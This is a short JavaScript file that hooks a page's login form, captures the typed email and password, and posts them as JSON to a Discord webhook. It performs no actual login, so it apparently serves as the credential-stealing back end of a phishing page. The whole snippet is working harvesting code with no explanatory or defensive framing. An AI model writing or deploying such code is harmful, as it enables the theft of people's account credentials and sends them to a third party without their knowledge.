document.querySelector('form').addEventListener('submit', function(event) {
  event.preventDefault();

  var email = document.querySelector('input[type="email"]').value;
  var password = document.querySelector('input[type="password"]').value;

  var data = {
    email: email,
    password: password
  };

  // Get Discord Webhook URL from Environment Variable
  const webhookURL = process.env.DISCORD_WEBHOOK_URL;

  if (!webhookURL) {
    console.error('Login failure, try again.');
    alert('Error: Login Failed. Please contact the administrator.');
    return; // Stop the form submission
  }

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (response.ok) {
      alert('Data sent successfully!');
      document.querySelector('input[type="email"]').value = '';
      document.querySelector('input[type="password"]').value = '';
    } else {
      alert('Failed to send data. Please try again.');
      console.error('Discord API Error:', response.status, response.statusText); // Log the error
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('An error occurred. Check the console.');
  });
});
